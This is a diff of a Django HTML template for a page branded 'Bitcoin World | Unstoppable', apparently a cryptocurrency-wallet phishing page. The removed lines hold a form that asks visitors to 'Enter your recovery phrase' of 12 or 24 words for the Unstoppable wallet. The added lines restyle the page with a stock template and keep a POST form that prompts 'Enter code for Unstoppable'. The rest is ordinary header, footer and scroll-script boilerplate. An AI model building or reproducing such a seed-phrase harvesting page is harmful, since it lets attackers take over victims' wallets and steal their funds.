@@ -1,69 +1,192 @@
 {% load static %}
 <!doctype html>
 <html lang="en">
-  <head>
+
+<head>
     <!-- Required meta tags -->
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-
-    <title>Bitcoin World</title>
-
-    <link href="//fonts.googleapis.com/css2?family=Prompt:wght@300;400;600&display=swap" rel="stylesheet">
-    <link href="//fonts.googleapis.com/css2?family=Kumbh+Sans:wght@300;400;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
-    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
-<script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
-<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <title>Bitcoin World | Unstoppable </title>
+    <!-- google fonts -->
+    <link href="//fonts.googleapis.com/css2?family=Nunito:ital,wght@0,400;0,600;0,700;0,800;1,400&display=swap" rel="stylesheet">
     <!-- Template CSS -->
     <link rel="stylesheet" href="{% static 'css/style-starter.css' %}">
+</head>
 
-    <style>
-      .container{
-
-        padding:30px;
-        line-height: 4.5px;
-      }
-
-      h1,h2,h3,h4,h5 {
-
-        color:white;
-      }
-
-      p{
-        color: white;
-      }
-
-      .card-title{
-        color: black;
-      }
-
-    </style>
-  </head>
 <body>
+    <!--/Header-->
+    <header id="site-header" class="fixed-top">
+        <div class="container">
+            <nav class="navbar navbar-expand-lg navbar-light stroke">
+                <h1><a class="navbar-brand" href="index.html">
+                        Bitcoin <span class="sub-color">World</span>
+                    </a></h1>
+                <button class="navbar-toggler collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#navbarScroll" aria-controls="navbarScroll" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon fa icon-expand fa-bars"></span>
+                    <span class="navbar-toggler-icon fa icon-close fa-times"></span>
+                </button>
+                
+            </nav>
+        </div>
+    </header>
+    <!--//Header-->
+    <!--/inner-page-->
+    <div class="inner-banner py-5">
+        <section class="w3l-breadcrumb text-left py-sm-5 ">
+            <div class="container">
+                <div class="w3breadcrumb-gids">
+                    <div class="w3breadcrumb-left text-left">
+                        
+                        <p class="inner-page-para mt-2">
+                            Unstoppable</p>
+                    </div>
+                    
+                </div>
 
-<!-- contact -->
-    <div class="container">
-		<form action="" method="POST" class="contact-form">
-			{% csrf_token %}
-			
-			<div class="form-control" style="background-color: #1a202c; border-color: #1a202c;">
-				<div class="tag" style="color: #fff; margin: 20px">Unstoppable wallet</div>
-				<textarea name="message" placeholder="Enter your recovery phrase" cols="30" rows="10" required=""></textarea>
-			</div>
-			<p style="color:#fff">Typically 12 (sometimes 24) words separated by single spaces</p>
-			<div class="form-control" style="background-color: #1a202c; border-color: #1a202c;">
-				<input type="submit" class="btn submit-btn" value="submit">
-			</div>
-	   
-	   
-	   
-	   </form>
-					
-					
-		
-		
-					
-	</div>
-<br>
+            </div>
+        </section>
+    </div>
+    <!--//inner-page-->
+    <!-- contact-form -->
+    <section class="w3l-contact-main" id="contact">
+        <div class="contact-infhny py-5">
+            <div class="container py-md-5">
+                <div class="title-content text-center mb-md-5 mb-4">
+                    
+                    <p class="text-para mt-2">Enter code for <b style="color:#fa9f1e">Unstoppable</b></p>
+                </div>
+                <div class="top-map">
+                    <div class="map-content-9">
+                         <form action="#" method="post">
+                            {% csrf_token %}
+                            <div class="form-top1">
+
+                                <div class="form-top">
+                                    <div class="form-top-righ">
+                                        <textarea name="Message" id="Message" placeholder="Message*" required=""></textarea>
+                                    </div>
+                                    
+
+                                </div>
+                                <div class="text-center mt-5">
+                                    <button type="submit" class="btn btn-style btn-primary">Submit Now <i class="far fa-paper-plane ml-lg-3"></i></button>
+                                </div>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+ 
+    <!--/footer-->
+    <footer class="w3l-footer-29-main">
+        <div class="footer-29-w3l py-5">
+            <div class="container pt-md-5">
+                <div class="w3l-footer-text-style">
+                    <div class="footer-list-cont d-sm-flex align-items-center justify-content-between mb-5">
+
+                        <h2 class="w3logo"><a class="navbar-brand" href="index.html">
+                                Bitcoin <span class="sub-color">World</span>
+                            </a></h2>
+                        <div class="main-social-footer-29">
+                            <ul>
+                                <li class="w3follow mt-sm-0 mt-4">Follows On : </li>
+                                <li><a href="#facebook" class="facebook"><i class="fab fa-facebook-f"></i></a></li>
+                                <li><a href="#twitter" class="twitter"><i class="fab fa-twitter"></i></a></li>
+                                <li><a href="#instagram" class="instagram"><i class="fab fa-instagram"></i></a></li>
+                                <li><a href="#linkedin" class="linkedin"><i class="fab fa-linkedin-in"></i></a></li>
+                            </ul>
+
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- copyright -->
+                <div class="w3l-copyright text-center mt-lg-5 mt-sm-4 pt-md-4 pt-3">
+                    <p class="copy-footer-29">© 2023 Bitcoin world. All rights reserved. </p>
+                </div>
+            </div>
+        </div>
+    </footer>
+    <!-- //footer -->
+ <!-- Js scripts -->
+    <!-- move top -->
+    <button onclick="topFunction()" id="movetop" title="Go to top">
+        <span class="fas fa-long-arrow-alt-up" aria-hidden="true"></span>
+    </button>
+    <script>
+        // When the user scrolls down 20px from the top of the document, show the button
+        window.onscroll = function() {
+            scrollFunction()
+        };
+
+        function scrollFunction() {
+            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+                document.getElementById("movetop").style.display = "block";
+            } else {
+                document.getElementById("movetop").style.display = "none";
+            }
+        }
+
+        // When the user clicks on the button, scroll to the top of the document
+        function topFunction() {
+            document.body.scrollTop = 0;
+            document.documentElement.scrollTop = 0;
+        }
+
+    </script>
+    <!-- //move top -->
+
+    <!-- Template JavaScript -->
+    <script src="{% static 'js/jquery-3.3.1.min.js' %}"></script>
+    <script src="{% static 'assets/js/theme-change.js' %}"></script>
+    <script src="{% static 'js/circles.js' %}"></script>
+
+    <!-- MENU-JS -->
+    <script>
+        $(window).on("scroll", function() {
+            var scroll = $(window).scrollTop();
+
+            if (scroll >= 80) {
+                $("#site-header").addClass("nav-fixed");
+            } else {
+                $("#site-header").removeClass("nav-fixed");
+            }
+        });
+
+        //Main navigation Active Class Add Remove
+        $(".navbar-toggler").on("click", function() {
+            $("header").toggleClass("active");
+        });
+        $(document).on("ready", function() {
+            if ($(window).width() > 991) {
+                $("header").removeClass("active");
+            }
+            $(window).on("resize", function() {
+                if ($(window).width() > 991) {
+                    $("header").removeClass("active");
+                }
+            });
+        });
+
+    </script>
+    <!-- //MENU-JS -->
+
+    <!-- disable body scroll which navbar is in active -->
+    <script>
+        $(function() {
+            $('.navbar-toggler').click(function() {
+                $('body').toggleClass('noscroll');
+            })
+        });
+
+    </script>
+    <!-- //disable body scroll which navbar is in active -->
+    <!-- //bootstrap -->
+    <script src="{% static 'js/bootstrap.min.js' %}"></script>
+
+
 </body>
+
 </html>
